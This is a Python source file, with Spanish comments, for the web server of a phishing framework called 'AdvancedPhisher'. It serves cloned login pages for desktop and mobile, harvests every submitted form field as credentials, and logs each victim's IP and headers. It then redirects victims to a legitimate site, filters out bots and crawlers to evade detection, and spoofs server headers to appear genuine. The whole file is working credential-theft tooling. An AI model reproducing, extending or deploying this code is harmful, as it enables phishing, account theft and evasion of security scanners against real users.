#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Web Server - Servidor web avanzado con SSL y anti-detección
Parte del framework AdvancedPhisher
"""

import os
import ssl
import json
import time
import threading
from pathlib import Path
from datetime import datetime
from flask import Flask, request, render_template, redirect, jsonify, send_from_directory
from werkzeug.serving import WSGIRequestHandler, make_server
from jinja2 import Template
from colorama import Fore, Style
from core.logger import Logger
from core.domain_manager import DomainManager

class AdvancedWebServer:
    def __init__(self, domain_manager, logger, config):
        self.domain_manager = domain_manager
        self.logger = logger
        self.config = config
        self.app = Flask(__name__)
        self.server = None
        self.server_thread = None
        self.current_domain = None
        self.current_template = None
        
        # Configurar rutas
        self.setup_routes()
        
        # Estadísticas en tiempo real
        self.stats = {
            'visits': 0,
            'captures': 0,
            'blocked_ips': set(),
            'start_time': None
        }
        
    def setup_routes(self):
        """Configurar rutas del servidor web"""
        
        @self.app.route('/')
        def index():
            return self.handle_index()
            
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            return self.handle_login()
            
        @self.app.route('/mobile')
        def mobile():
            return self.handle_mobile()
            
        @self.app.route('/api/capture', methods=['POST'])
        def capture():
            return self.handle_capture()
            
        @self.app.route('/static/<path:filename>')
        def static_files(filename):
            return self.handle_static(filename)
            
        @self.app.route('/favicon.ico')
        def favicon():
            return self.handle_favicon()
            
        @self.app.before_request
        def before_request():
            return self.security_checks()
            
        @self.app.after_request
        def after_request(response):
            return self.add_security_headers(response)
            
    def handle_index(self):
        """Manejar página principal"""
        try:
            # Registrar visita
            self.log_visit()
            
            # Detectar dispositivo
            user_agent = request.headers.get('User-Agent', '')
            is_mobile = self.detect_mobile_device(user_agent)
            
            # Cargar template apropiado
            if is_mobile:
                return self.render_mobile_template()
            else:
                return self.render_desktop_template()
                
        except Exception as e:
            self.logger.error(f"Error en handle_index: {str(e)}")
            return self.render_error_page()
            
    def handle_login(self):
        """Manejar página de login"""
        if request.method == 'GET':
            return self.render_login_template()
        elif request.method == 'POST':
            return self.process_credentials()
            
    def handle_mobile(self):
        """Manejar versión móvil"""
        return self.render_mobile_template()
        
    def handle_capture(self):
        """Manejar captura de datos via API"""
        try:
            data = request.get_json()
            if data:
                self.capture_credentials(data)
                return jsonify({'status': 'success'})
            return jsonify({'status': 'error', 'message': 'No data received'})
        except Exception as e:
            self.logger.error(f"Error en handle_capture: {str(e)}")
            return jsonify({'status': 'error', 'message': 'Internal error'})
            
    def handle_static(self, filename):
        """Manejar archivos estáticos"""
        static_dir = self.get_template_static_dir()
        if static_dir and static_dir.exists():
            return send_from_directory(str(static_dir), filename)
        return '', 404
        
    def handle_favicon(self):
        """Manejar favicon"""
        favicon_path = self.get_template_dir() / 'favicon.ico'
        if favicon_path.exists():
            return send_from_directory(str(favicon_path.parent), 'favicon.ico')
        return '', 404
        
    def security_checks(self):
        """Verificaciones de seguridad antes de cada request"""
        client_ip = self.get_client_ip()
        
        # Verificar IP bloqueada
        if self.is_ip_blocked(client_ip):
            self.logger.warning(f"IP bloqueada intentó acceder: {client_ip}")
            return '', 403
            
        # Rate limiting
        if not self.check_rate_limit(client_ip):
            self.logger.warning(f"Rate limit excedido para IP: {client_ip}")
            return '', 429
            
        # Filtros geográficos
        if self.current_domain and self.current_domain.get('geo_filter'):
            if not self.check_geo_filter(client_ip):
                return '', 403
                
        # Filtros de User-Agent
        if self.current_domain and self.current_domain.get('user_agent_filter'):
            if not self.check_user_agent_filter():
                return '', 403
                
        return None
        
    def add_security_headers(self, response):
        """Agregar headers de seguridad"""
        # Headers para parecer legítimo
        response.headers['Server'] = 'nginx/1.18.0'
        response.headers['X-Powered-By'] = 'PHP/7.4.3'
        
        # Headers de seguridad básicos
        if self.current_domain and self.current_domain.get('stealth_mode'):
            response.headers['X-Frame-Options'] = 'SAMEORIGIN'
            response.headers['X-Content-Type-Options'] = 'nosniff'
            response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
            
        return response
        
    def log_visit(self):
        """Registrar visita"""
        client_ip = self.get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        referer = request.headers.get('Referer', '')
        
        visit_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': client_ip,
            'user_agent': user_agent,
            'referer': referer,
            'path': request.path,
            'method': request.method,
            'headers': dict(request.headers)
        }
        
        self.logger.log_visit(visit_data)
        self.stats['visits'] += 1
        
    def capture_credentials(self, data):
        """Capturar credenciales"""
        client_ip = self.get_client_ip()
        user_agent = request.headers.get('User-Agent', '')
        
        capture_data = {
            'timestamp': datetime.now().isoformat(),
            'ip': client_ip,
            'user_agent': user_agent,
            'domain': self.current_domain.get('domain') if self.current_domain else 'unknown',
            'template': self.current_template,
            'credentials': data,
            'headers': dict(request.headers)
        }
        
        self.logger.log_capture(capture_data)
        self.stats['captures'] += 1
        
        # Actualizar estadísticas del dominio
        if self.current_domain:
            domain_name = next((k for k, v in self.domain_manager.domains.items() 
                              if v['domain'] == self.current_domain['domain']), None)
            if domain_name:
                self.domain_manager.update_domain_stats(domain_name, captures=1)
                
    def process_credentials(self):
        """Procesar credenciales del formulario"""
        try:
            # Extraer datos del formulario
            credentials = {}
            for field in request.form:
                credentials[field] = request.form[field]
                
            # Capturar credenciales
            self.capture_credentials(credentials)
            
            # Redireccionar a sitio legítimo
            redirect_url = self.current_domain.get('redirect_url') if self.current_domain else 'https://google.com'
            return redirect(redirect_url)
            
        except Exception as e:
            self.logger.error(f"Error procesando credenciales: {str(e)}")
            return self.render_error_page()
            
    def detect_mobile_device(self, user_agent):
        """Detectar dispositivo móvil"""
        mobile_keywords = [
            'Mobile', 'Android', 'iPhone', 'iPad', 'Windows Phone',
            'BlackBerry', 'Opera Mini', 'IEMobile'
        ]
        return any(keyword in user_agent for keyword in mobile_keywords)
        
    def render_desktop_template(self):
        """Renderizar template de escritorio"""
        template_path = self.get_template_dir() / 'index.html'
        if template_path.exists():
            with open(template_path, 'r', encoding='utf-8') as f:
                template_content = f.read()
            return Template(template_content).render(
                domain=self.current_domain.get('domain') if self.current_domain else 'localhost'
            )
        return self.render_default_template()
        
    def render_mobile_template(self):
        """Renderizar template móvil"""
        template_path = self.get_template_dir() / 'mobile.html'
        if template_path.exists():
            with open(template_path, 'r', encoding='utf-8') as f:
                template_content = f.read()
            return Template(template_content).render(
                domain=self.current_domain.get('domain') if self.current_domain else 'localhost'
            )
        return self.render_desktop_template()
        
    def render_login_template(self):
        """Renderizar template de login"""
        template_path = self.get_template_dir() / 'login.html'
        if template_path.exists():
            with open(template_path, 'r', encoding='utf-8') as f:
                template_content = f.read()
            return Template(template_content).render(
                domain=self.current_domain.get('domain') if self.current_domain else 'localhost'
            )
        return self.render_default_template()
        
    def render_default_template(self):
        """Renderizar template por defecto"""
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Loading...</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
        </head>
        <body>
            <div style="text-align: center; margin-top: 50px;">
                <h2>Loading...</h2>
                <p>Please wait while we redirect you.</p>
                <script>
                    setTimeout(function() {
                        window.location.href = 'https://google.com';
                    }, 2000);
                </script>
            </div>
        </body>
        </html>
        '''
        
    def render_error_page(self):
        """Renderizar página de error"""
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Error 404</title>
            <meta charset="utf-8">
        </head>
        <body>
            <h1>404 - Page Not Found</h1>
            <p>The requested page could not be found.</p>
        </body>
        </html>
        ''', 404
        
    def get_template_dir(self):
        """Obtener directorio del template actual"""
        if self.current_template:
            base_dir = Path(__file__).parent.parent
            return base_dir / 'templates' / self.current_template
        return None
        
    def get_template_static_dir(self):
        """Obtener directorio de archivos estáticos del template"""
        template_dir = self.get_template_dir()
        if template_dir:
            return template_dir / 'static'
        return None
        
    def get_client_ip(self):
        """Obtener IP real del cliente"""
        # Verificar headers de proxy
        forwarded_ips = request.headers.get('X-Forwarded-For')
        if forwarded_ips:
            return forwarded_ips.split(',')[0].strip()
            
        real_ip = request.headers.get('X-Real-IP')
        if real_ip:
            return real_ip
            
        return request.remote_addr
        
    def is_ip_blocked(self, ip):
        """Verificar si una IP está bloqueada"""
        return ip in self.stats['blocked_ips']
        
    def block_ip(self, ip):
        """Bloquear una IP"""
        self.stats['blocked_ips'].add(ip)
        self.logger.warning(f"IP bloqueada: {ip}")
        
    def check_rate_limit(self, ip):
        """Verificar rate limiting"""
        # Implementación básica - se puede mejorar con Redis
        return True
        
    def check_geo_filter(self, ip):
        """Verificar filtros geográficos"""
        # Implementación básica - se puede mejorar con GeoIP
        return True
        
    def check_user_agent_filter(self):
        """Verificar filtros de User-Agent"""
        user_agent = request.headers.get('User-Agent', '')
        
        # Bloquear bots conocidos
        bot_keywords = ['bot', 'crawler', 'spider', 'scraper']
        if any(keyword in user_agent.lower() for keyword in bot_keywords):
            return False
            
        return True
        
    def start_server(self, domain_name, host='0.0.0.0', port=8080, ssl_enabled=False):
        """Iniciar servidor web"""
        try:
            # Obtener configuración del dominio
            if domain_name in self.domain_manager.domains:
                self.current_domain = self.domain_manager.domains[domain_name]
                self.current_template = self.current_domain.get('template')
                
                if ssl_enabled and self.current_domain.get('ssl'):
                    port = self.current_domain.get('port', 443)
                else:
                    port = self.current_domain.get('port', 8080)
                    
            # Configurar SSL si está habilitado
            ssl_context = None
            if ssl_enabled and self.current_domain and self.current_domain.get('ssl'):
                ssl_context = self.setup_ssl_context(self.current_domain['domain'])
                
            # Crear servidor
            self.server = make_server(
                host, port, self.app,
                ssl_context=ssl_context,
                request_handler=WSGIRequestHandler
            )
            
            # Iniciar estadísticas
            self.stats['start_time'] = datetime.now()
            
            print(f"{Fore.GREEN}[+] Servidor iniciado en {'https' if ssl_context else 'http'}://{host}:{port}{Style.RESET_ALL}")
            
            if self.current_domain:
                print(f"{Fore.CYAN}[+] Dominio: {self.current_domain['domain']}{Style.RESET_ALL}")
                print(f"{Fore.CYAN}[+] Template: {self.current_template}{Style.RESET_ALL}")
                
            # Iniciar servidor en hilo separado
            self.server_thread = threading.Thread(target=self.server.serve_forever)
            self.server_thread.daemon = True
            self.server_thread.start()
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error iniciando servidor: {str(e)}")
            print(f"{Fore.RED}[-] Error iniciando servidor: {str(e)}{Style.RESET_ALL}")
            return False
            
    def stop_server(self):
        """Detener servidor web"""
        if self.server:
            self.server.shutdown()
            self.server = None
            
        if self.server_thread:
            self.server_thread.join(timeout=5)
            self.server_thread = None
            
        print(f"{Fore.YELLOW}[!] Servidor detenido{Style.RESET_ALL}")
        
    def setup_ssl_context(self, domain):
        """Configurar contexto SSL"""
        try:
            cert_path = Path(__file__).parent.parent / 'certs' / f'{domain}.crt'
            key_path = Path(__file__).parent.parent / 'certs' / f'{domain}.key'
            
            # Generar certificados si no existen
            if not cert_path.exists() or not key_path.exists():
                result = self.domain_manager.generate_self_signed_cert(domain)
                if not result['success']:
                    raise Exception(f"Error generando certificados: {result['error']}")
                    
            # Crear contexto SSL
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(str(cert_path), str(key_path))
            
            return context
            
        except Exception as e:
            self.logger.error(f"Error configurando SSL: {str(e)}")
            return None
            
    def get_server_stats(self):
        """Obtener estadísticas del servidor"""
        uptime = None
        if self.stats['start_time']:
            uptime = datetime.now() - self.stats['start_time']
            
        return {
            'visits': self.stats['visits'],
            'captures': self.stats['captures'],
            'blocked_ips': len(self.stats['blocked_ips']),
            'uptime': str(uptime) if uptime else None,
            'success_rate': (self.stats['captures'] / self.stats['visits'] * 100) if self.stats['visits'] > 0 else 0,
            'current_domain': self.current_domain.get('domain') if self.current_domain else None,
            'current_template': self.current_template
        }
        
    def is_running(self):
        """Verificar si el servidor está ejecutándose"""
        return self.server is not None and self.server_thread is not None and self.server_thread.is_alive()